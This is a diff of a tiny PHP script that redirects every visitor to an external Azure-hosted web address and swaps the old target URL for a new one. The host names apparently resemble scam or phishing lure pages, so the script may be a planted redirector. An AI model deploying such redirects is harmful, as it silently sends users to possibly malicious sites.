@@ -1,6 +1,5 @@
 <?php
-$url = "
-https://corefxlock86.z1.web.core.windows.net/";
+$url = "https://deli8corefxxx.z13.web.core.windows.net/";
 header('Location: '.$url);
 die();
 ?>
